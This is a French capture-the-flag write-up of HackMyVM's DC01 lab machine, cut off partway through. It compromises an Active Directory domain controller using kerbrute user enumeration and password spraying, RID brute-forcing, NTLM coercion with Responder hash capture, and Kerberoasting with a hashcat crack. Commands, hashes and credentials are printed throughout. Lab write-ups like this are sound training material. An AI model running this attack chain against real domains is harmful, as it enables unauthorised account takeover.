---
title: "Solution du CTF DC01 de HackMyVM.eu"
tags: [CTF,HackMyVM,Windows]
---

### Dans le doute, reboot

On a ici une machine qui est clairement un contrôleur de domaine. Le nom du CTF était, lui aussi, explicite. 

```console
$ sudo nmap -sCV --script vuln -T5 -p- 192.168.56.128
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-17 16:53 CEST
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 192.168.56.128
Host is up (0.00044s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-17 23:54:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-csrf: Couldn't find any CSRF vulnerabilities.
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:B0:53:C1 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 245.38 seconds
```

Les connexions anonymes sont refusées, mais on peut accéder à la liste des partages avec le compte invité :

```console
$ smbclient -U "" -N -L //192.168.56.128
session setup failed: NT_STATUS_ACCESS_DENIED
$ smbclient -U "guest" -N -L //192.168.56.128
session setup failed: NT_STATUS_LOGON_FAILURE
$ smbclient -U "guest" -L //192.168.56.128
Password for [WORKGROUP\guest]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      
SMB1 disabled -- no workgroup available
```

On ne dispose toutefois pas d'accès lecture sur les disques.

```console
$ ./nxc smb -u guest -p "" --shares 192.168.56.128
SMB         192.168.56.128  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
SMB         192.168.56.128  445    DC01             [*] Enumerated shares
SMB         192.168.56.128  445    DC01             Share           Permissions     Remark
SMB         192.168.56.128  445    DC01             -----           -----------     ------
SMB         192.168.56.128  445    DC01             ADMIN$                          Remote Admin
SMB         192.168.56.128  445    DC01             backup                          
SMB         192.168.56.128  445    DC01             C$                              Default share
SMB         192.168.56.128  445    DC01             IPC$            READ            Remote IPC
SMB         192.168.56.128  445    DC01             NETLOGON                        Logon server share 
SMB         192.168.56.128  445    DC01             SYSVOL                          Logon server share 
SMB         192.168.56.128  445    DC01             Users
```

On peut regarder un peu les données du LDAP mais on n'ira pas plus loin pour des raisons de permissions :

```console
$ ldapsearch -H ldap://192.168.56.128/ -x -s base -b '' "(objectClass=*)" "*" +
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectClass=*)
# requesting: * + 
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=SOUPEDECODE,DC=LOCAL
ldapServiceName: SOUPEDECODE.LOCAL:dc01$@SOUPEDECODE.LOCAL
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
--- snip ---
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=L
 OCAL
serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur
 ation,DC=SOUPEDECODE,DC=LOCAL
schemaNamingContext: CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
namingContexts: DC=SOUPEDECODE,DC=LOCAL
namingContexts: CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
namingContexts: CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
namingContexts: DC=DomainDnsZones,DC=SOUPEDECODE,DC=LOCAL
namingContexts: DC=ForestDnsZones,DC=SOUPEDECODE,DC=LOCAL
isSynchronized: TRUE
highestCommittedUSN: 159768
dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,
 CN=Sites,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
dnsHostName: DC01.SOUPEDECODE.LOCAL
defaultNamingContext: DC=SOUPEDECODE,DC=LOCAL
currentTime: 20250617235209.0Z
configurationNamingContext: CN=Configuration,DC=SOUPEDECODE,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Étant donné qu'on ne dispose d'aucun compte utilisateur, je me suis orienté vers kerbrute, un outil dont j'ai eu vent via [0xdf hacks stuff](https://0xdf.gitlab.io/).

```console
kerbrute userenum -d soupedecode.local --dc 192.168.56.128 /opt/SecLists/Usernames/Names/names.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/17/25 - Ronnie Flathers @ropnop

2025/06/17 17:12:48 >  Using KDC(s):
2025/06/17 17:12:48 >   192.168.56.128:88

2025/06/17 17:12:48 >  [+] VALID USERNAME:       admin@soupedecode.local
2025/06/17 17:12:48 >  [+] VALID USERNAME:       charlie@soupedecode.local
2025/06/17 17:12:53 >  Done! Tested 10177 usernames (2 valid) in 5.684 seconds
```

J'ai ensuite essayé de brute-forcer le compte Charlie, mais ça bloque après seulement 4761 tentatives...

```console
kerbrute bruteuser --dc 192.168.56.128 -d soupedecode.local /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt charlie

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/17/25 - Ronnie Flathers @ropnop

2025/06/17 17:17:36 >  Using KDC(s):
2025/06/17 17:17:36 >   192.168.56.128:88

2025/06/17 17:18:16 >  [!] charlie@soupedecode.local: - client has neither a keytab nor a password set and no session
2025/06/17 17:18:17 >  Done! Tested 4761 logins (0 successes) in 40.912 seconds
```

Sur du brute-force via SMB, on tombe sur un autre problème : la mauvaise habitude que Windows a de redémarrer sans prévenir.

J'ai ensuite fait une énumération des utilisateurs SMB via le RID :

```console
$ ./nxc smb -u guest -p "" --rid-brute 10000 192.168.56.128 | tee /tmp/userlist.txt
SMB                      192.168.56.128  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB                      192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
SMB                      192.168.56.128  445    DC01             498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB                      192.168.56.128  445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
SMB                      192.168.56.128  445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
SMB                      192.168.56.128  445    DC01             502: SOUPEDECODE\krbtgt (SidTypeUser)
SMB                      192.168.56.128  445    DC01             512: SOUPEDECODE\Domain Admins (SidTypeGroup)
SMB                      192.168.56.128  445    DC01             513: SOUPEDECODE\Domain Users (SidTypeGroup)
SMB                      192.168.56.128  445    DC01             514: SOUPEDECODE\Domain Guests (SidTypeGroup)
SMB                      192.168.56.128  445    DC01             515: SOUPEDECODE\Domain Computers (SidTypeGroup)
--- snip ---
```

J'ai extrait la partie après le domaine pour avoir la liste des utilisateurs. `awk` fonctionne très bien pour cela :

```bash
cat /tmp/userlist.txt | awk '{ print $6 }' | cut -d\\ -f2
```

`kerbrute` a une option pour spécifier des combos (`utilisateur:password`). Vu que la machine redémarrera avant qu'on ait pu faire un long brute-force, tester seulement le combo `utilisateur:utilisateur` sera plus rapide et a des chances de terminer.

Pour générer cette liste un peu de Python :

```python
with open("uniq_users.txt") as fd:
    for line in fd:
        user = line.strip()
        print(f"{user}:{user}")
```

On parvient à casser un compte :

```console
$ ./kerbrute bruteforce -d soupedecode.local --dc 192.168.56.128 /tmp/combos.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/17/25 - Ronnie Flathers @ropnop

2025/06/17 21:22:02 >  Using KDC(s):
2025/06/17 21:22:02 >   192.168.56.128:88

2025/06/17 21:22:03 >  [+] VALID LOGIN WITH ERROR:       ybob317@soupedecode.local:ybob317       (Clock skew is too great)
2025/06/17 21:22:03 >  Done! Tested 1083 logins (1 successes) in 1.443 seconds
```

### Bob l'éponge

Cette fois, on a accès à plusieurs partages :

```console
$ ./nxc smb -u ybob317 -p ybob317 --shares 192.168.56.128
SMB         192.168.56.128  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
SMB         192.168.56.128  445    DC01             [*] Enumerated shares
SMB         192.168.56.128  445    DC01             Share           Permissions     Remark
SMB         192.168.56.128  445    DC01             -----           -----------     ------
SMB         192.168.56.128  445    DC01             ADMIN$                          Remote Admin
SMB         192.168.56.128  445    DC01             backup                          
SMB         192.168.56.128  445    DC01             C$                              Default share
SMB         192.168.56.128  445    DC01             IPC$            READ            Remote IPC
SMB         192.168.56.128  445    DC01             NETLOGON        READ            Logon server share 
SMB         192.168.56.128  445    DC01             SYSVOL          READ            Logon server share 
SMB         192.168.56.128  445    DC01             Users           READ
```

On se rend compte qu'on est loin des 1000 et quelques accounts obtenus via RID :

```console
$ smbclient -U ybob317 //192.168.56.128/Users
Password for [WORKGROUP\ybob317]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Jul  5 00:48:22 2024
  ..                                DHS        0  Mon Jun 17 19:42:50 2024
  admin                               D        0  Fri Jul  5 00:49:01 2024
  Administrator                       D        0  Sat Jun 15 21:56:40 2024
  All Users                       DHSrn        0  Sat May  8 10:26:16 2021
  Default                           DHR        0  Sun Jun 16 04:51:08 2024
  Default User                    DHSrn        0  Sat May  8 10:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 10:14:03 2021
  Public                             DR        0  Sat Jun 15 19:54:32 2024
  ybob317                             D        0  Mon Jun 17 19:24:32 2024

                12942591 blocks of size 4096. 10967603 blocks available
smb: \> cd ybob317\
smb: \ybob317\> ls
  .                                   D        0  Mon Jun 17 19:24:32 2024
  ..                                 DR        0  Fri Jul  5 00:48:22 2024
  3D Objects                         DR        0  Mon Jun 17 19:24:32 2024
  AppData                            DH        0  Mon Jun 17 19:24:30 2024
  Application Data                DHSrn        0  Mon Jun 17 19:24:30 2024
  Contacts                           DR        0  Mon Jun 17 19:24:32 2024
  Cookies                         DHSrn        0  Mon Jun 17 19:24:30 2024
  Desktop                            DR        0  Mon Jun 17 19:45:32 2024
  Documents                          DR        0  Mon Jun 17 19:24:32 2024
  Downloads                          DR        0  Mon Jun 17 19:24:32 2024
  Favorites                          DR        0  Mon Jun 17 19:24:32 2024
  Links                              DR        0  Mon Jun 17 19:24:32 2024
  Local Settings                  DHSrn        0  Mon Jun 17 19:24:30 2024
  Music                              DR        0  Mon Jun 17 19:24:32 2024
  My Documents                    DHSrn        0  Mon Jun 17 19:24:30 2024
  NetHood                         DHSrn        0  Mon Jun 17 19:24:30 2024
  NTUSER.DAT                        AHn   262144  Wed Jun 18 03:21:13 2025
  ntuser.dat.LOG1                   AHS    81920  Mon Jun 17 19:24:29 2024
  ntuser.dat.LOG2                   AHS        0  Mon Jun 17 19:24:29 2024
  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TM.blf    AHS    65536  Mon Jun 17 19:24:54 2024
  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Mon Jun 17 19:24:29 2024
  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Mon Jun 17 19:24:29 2024
  ntuser.ini                        AHS       20  Mon Jun 17 19:24:30 2024
  Pictures                           DR        0  Mon Jun 17 19:24:32 2024
  Recent                          DHSrn        0  Mon Jun 17 19:24:30 2024
  Saved Games                        DR        0  Mon Jun 17 19:24:32 2024
  Searches                           DR        0  Mon Jun 17 19:24:32 2024
  SendTo                          DHSrn        0  Mon Jun 17 19:24:30 2024
  Start Menu                      DHSrn        0  Mon Jun 17 19:24:30 2024
  Templates                       DHSrn        0  Mon Jun 17 19:24:30 2024
  Videos                             DR        0  Mon Jun 17 19:24:32 2024

                12942591 blocks of size 4096. 10967603 blocks available
smb: \ybob317\> cd Desktop
smb: \ybob317\Desktop\> ls
  .                                  DR        0  Mon Jun 17 19:45:32 2024
  ..                                  D        0  Mon Jun 17 19:24:32 2024
  desktop.ini                       AHS      282  Mon Jun 17 19:24:32 2024
  user.txt                            A       32  Wed Jun 12 13:54:32 2024

                12942591 blocks of size 4096. 10965043 blocks available
smb: \ybob317\Desktop\> get user.txt
getting file \ybob317\Desktop\user.txt of size 32 as user.txt (2,6 KiloBytes/sec) (average 2,6 KiloBytes/sec)
```

On obtient le premier flag :

```
6bab1f09a7403980bfeb4c2b412be47b
```

J'ai aussi testé le module `coerce_plus` de NetExec :

```console
$ ./nxc smb 192.168.56.128 -u ybob317 -p ybob317 -M coerce_plus -o LISTENER=192.168.56.1 ALWAYS=true
SMB         192.168.56.128  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
COERCE_PLUS 192.168.56.128  445    DC01             VULNERABLE, DFSCoerce
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, netdfs\NetrDfsRemoveRootTarget
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, netdfs\NetrDfsAddStdRoot
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, netdfs\NetrDfsRemoveStdRoot
COERCE_PLUS 192.168.56.128  445    DC01             VULNERABLE, PetitPotam
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, lsarpc\EfsRpcAddUsersToFileEx
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, lsarpc\EfsRpcDecryptFileSrv
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, lsarpc\EfsRpcDuplicateEncryptionInfoFile
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, lsarpc\EfsRpcEncryptFileSrv
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, lsarpc\EfsRpcEncryptFileSrv
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, lsarpc\EfsRpcFileKeyInfo
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, lsarpc\EfsRpcQueryRecoveryAgents
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, lsarpc\EfsRpcQueryUsersOnFile
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, lsarpc\EfsRpcRemoveUsersFromFile
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, samr\EfsRpcAddUsersToFile
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, samr\EfsRpcAddUsersToFileEx
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, samr\EfsRpcDecryptFileSrv
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, samr\EfsRpcDuplicateEncryptionInfoFile
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, samr\EfsRpcEncryptFileSrv
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, samr\EfsRpcEncryptFileSrv
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, samr\EfsRpcFileKeyInfo
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, samr\EfsRpcQueryRecoveryAgents
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, samr\EfsRpcQueryUsersOnFile
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, samr\EfsRpcRemoveUsersFromFile
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, lsass\EfsRpcAddUsersToFile
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, lsass\EfsRpcAddUsersToFileEx
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, lsass\EfsRpcDecryptFileSrv
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, lsass\EfsRpcDuplicateEncryptionInfoFile
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, lsass\EfsRpcEncryptFileSrv
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, lsass\EfsRpcEncryptFileSrv
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, lsass\EfsRpcFileKeyInfo
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, lsass\EfsRpcQueryRecoveryAgents
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, lsass\EfsRpcQueryUsersOnFile
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, lsass\EfsRpcRemoveUsersFromFile
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, netlogon\EfsRpcAddUsersToFile
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, netlogon\EfsRpcAddUsersToFileEx
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, netlogon\EfsRpcDecryptFileSrv
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, netlogon\EfsRpcDuplicateEncryptionInfoFile
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, netlogon\EfsRpcEncryptFileSrv
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, netlogon\EfsRpcEncryptFileSrv
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, netlogon\EfsRpcFileKeyInfo
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, netlogon\EfsRpcQueryRecoveryAgents
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, netlogon\EfsRpcQueryUsersOnFile
COERCE_PLUS 192.168.56.128  445    DC01             Exploit Success, netlogon\EfsRpcRemoveUsersFromFile
[21:52:58] ERROR    Error in PrinterBug module: DCERPC Runtime Error: code: 0x16c9a0d6 - ept_s_not_registered                                                                                                              coerce_plus.py:179
           ERROR    Error in PrinterBug module: DCERPC Runtime Error: code: 0x16c9a0d6 - ept_s_not_registered                                                                                                              coerce_plus.py:179
COERCE_PLUS 192.168.56.128  445    DC01             VULNERABLE, MSEven
```

J'obtiens le hash NetNTLMv2 via Responder mais n'ayant pas pu le casser, ça me fait une belle jambe :

```console
[SMB] NTLMv2-SSP Client   : 192.168.56.128
[SMB] NTLMv2-SSP Username : SOUPEDECODE\DC01$
[SMB] NTLMv2-SSP Hash     : DC01$::SOUPEDECODE:60d38a7fecd0248a:2238E7FE0E054D9E49F0A242CEA0F219:0101000000000000009ADF0FD2DFDB01E2F633C9EBA7ED47000000000200080032004E005100460001001E00570049004E002D004100450044004E00510057004700320031004A004D0004003400570049004E002D004100450044004E00510057004700320031004A004D002E0032004E00510046002E004C004F00430041004C000300140032004E00510046002E004C004F00430041004C000500140032004E00510046002E004C004F00430041004C0007000800009ADF0FD2DFDB0106000400020000000800300030000000000000000000000000400000F7AD398D6A9711FBF0E0FF42D67F1EBBC410CBCC1BE292C880760BC1A8AA10610A001000000000000000000000000000000000000900220063006900660073002F003100390032002E003100360038002E00350036002E0031000000000000000000
```

### Roast my CTF

Avec un compte utilisateur, je me suis tourné vers Kerberoast, espérant casser le mot de passe d'un compte de service.

D'abord, il faut obtenir les hashs avec `GetUserSPNs.py` de Impacket :

```console
$ python GetUserSPNs.py -dc-ip 192.168.56.128 -outputfile /tmp/hashes.txt soupedecode.local/ybob317:ybob317
Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 19:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-17 19:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 19:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 19:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 19:29:18.511871  <never>               



[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Ici ça bloque, car on n'est pas synchro avec l'horloge du DC. On corrige ça et on relance : 



```console
(myvenv) root@nico-xps9320:/tmp/impacket/examples# systemctl stop systemd-timesyncd
(myvenv) root@nico-xps9320:/tmp/impacket/examples# sudo ntpdate -s 192.168.56.128
(myvenv) root@nico-xps9320:/tmp/impacket/examples# python GetUserSPNs.py -dc-ip 192.168.56.128 -outputfile /tmp/hashes.txt soupedecode.local/ybob317:ybob317
Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 19:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-17 19:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 19:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 19:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 19:29:18.511871  <never>               



[-] CCache file is not found. Skipping...
```

Cette fois, c'est bon. J'utilise l'image Docker `dizcza/docker-hashcat:intel-cpu` pour avoir hashcat :

```console
root@9d5edf15043b:~# hashcat -m 13100 -a 0 /data/hashes.txt /data/rockyou.txt --force
hashcat (v6.2.6-851-g6716447df) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: 13th Gen Intel(R) Core(TM) i7-1360P, 15820/31705 MB (7926 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 5 digests; 5 unique digests, 5 unique salts
--- snip ---

$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$soupedecode.local/file_svc*$8c676a9ce5a85912bb3696a1cfef0e5f$6d7875bae191b15ac1a7e6b9d667296b41bbd5cc7d638ed4100e3e055ffd405d72293e90ccf89f28c6b437804bfa26602b211777efccf5ceefa09e1f797078d9975da7a89f04133528a657bba7be86192935c5db5ce0b26ca0ade4d6d08111b8904451d4cc21b9119e5d5372403211e498f780790b9b04257adb9757679961cd2588250378147d98fbfbb00bf05abde345b8623556408b96fe188f210b429415b628e76380c016e26faed6775adf53ff000cfc82a9fb448d799e065f11625e85fe253ffd6e6683cee3b393689a3d1384abcdb3b1e904922ae652ea67015a05b0ea4a54689fd1daf2346cfc89f22a480e706866d3ab408e0035dbf78b5c1abcb65a7659c201492b064b40fa0e7b20b64917fc1946e6b229b0fce981fa7f88505bf909c87e1359f7ffaaa5c5113fbdbf491a078fd38e1b2b59188e5fcc3b771c1386564568f9721bb81d843eb6e294490da2763fdaad513d7393f5631557088726c0a11512d0940f5ca5c2104faabd3d944d045c59eb2c3828866b1421b7ede583cc829b5f1c55853c92e0e99cc92e182a44efc00d9b21eccd7ef5a0414f3b0180bfde47d5f8396534c5d8796e451eded7d03dcf7344435e73cb246b7364f89b4824733416b2757a130f4acd123cc9818b136df61d49d4e90554bb5ecf4c821546869743175a9fe2acf4faf99d610c85a03e0845b74662b2a3801e9c299cc60b2f68f599d40b207c314425e0ea275265b669e7a97f30ebf885647ea4c8a78828e8b6de166b63eecf46c8410945fc57e901e9c04b936bdf2c6fbd0ff3138712aa06881fcd9cd3ca9efe2f95ebacd5488c2f00eb5af5b5241edda9e25b59188851f7ee54b37cb02bffc562384e10e24ff7323a814e2f892761152085d01c1722c243b11ff8c50d3ecfe8cfb30f66422da7f952556a2483d969525c8b187c6b8ec1e771f215a9e05b0efad87c11f0867dccf74aabca8fca3e0f70c00d3ee3e5dc5a78f8a322ba820df079cce83f3b55d6260a624c4fdcba9a06aaa1ba50c7af35c8b051213808b7e710361ccfd02417e685f4465266a12c3ef3231285cb93b9fc2dbcdbe47081d21c1987cabbda8ba71939b8855e648d5cbbc53e5abf22257ac75970a2d97f14b968e1c1d0e3dd7960213b40fc5595c6f24e683ceaf255170c9375a2cbf6738148ba1c37d75198be3a34d136d84431512f8cc87d691a90bda0884c54ee4b6e998eb01dc738ccbb0579fdb000a51d5fb8d60fd22596adc9429b70fae2b6482755e71a2c114972cfb790099e34d78fa471ad48d305b40416d3de75818e648b28bae7a1e290243f4ee2c00a30aab7b1ba21c7a9789c721cc5fa4e2918d669b4d0f6ddfd9d5a3766aea1a75f66b419fe80ed89e3a35a1b1e3faad8f0d0129bd658e75955a806e72e8e01c2eab72f02a1b740e25cf5aaeb5e1601e7f412a997ee35b774b9d312dc0f4c18a7348f2432f30e9065bb91a9a24ad39d93b2a10ad6:Password123!!
```

Bingo ! Toutefois, je ne peux pas avoir de shell avec ce compte :

```console
$ psexec.py 'soupedecode.local/file_svc:Password123!!@192.168.56.128'
Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.56.128.....
[-] share 'ADMIN$' is not writable.
[-] share 'backup' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.
[-] share 'Users' is not writable.
```

Cet utilisateur semble faire partie des groupes `Users` et `Configuration`.



```console
$ ldapsearch -H ldap://192.168.56.128/ -D "file_svc@soupedecode.local" -w 'Password123!!' -b "DC=SOUPEDECODE,DC=LOCAL" "(&(objectClass=user)(sAMAccountName=file_svc))" memberOf primaryGroupID
# extended LDIF
#
# LDAPv3
# base <DC=SOUPEDECODE,DC=LOCAL> with scope subtree
# filter: (&(objectClass=user)(sAMAccountName=file_svc))
# requesting: memberOf primaryGroupID 
#

# file_svc .ora, Users, SOUPEDECODE.LOCAL
dn: CN=file_svc .ora,CN=Users,DC=SOUPEDECODE,DC=LOCAL
primaryGroupID: 513

# search reference
ref: ldap://ForestDnsZones.SOUPEDECODE.LOCAL/DC=ForestDnsZones,DC=SOUPEDECODE,
 DC=LOCAL

# search reference
ref: ldap://DomainDnsZones.SOUPEDECODE.LOCAL/DC=DomainDnsZones,DC=SOUPEDECODE,
 DC=LOCAL

# search reference
ref: ldap://SOUPEDECODE.LOCAL/CN=Configuration,DC=SOUPEDECODE,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

En revanche on a gagné un accès sur le partage backup :

```console
$ ./nxc smb 192.168.56.128 -u file_svc -p 'Password123!!' --shares
SMB         192.168.56.128  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
SMB         192.168.56.128  445    DC01             [*] Enumerated shares
SMB         192.168.56.128  445    DC01             Share           Permissions     Remark
SMB         192.168.56.128  445    DC01             -----           -----------     ------
SMB         192.168.56.128  445    DC01             ADMIN$                          Remote Admin
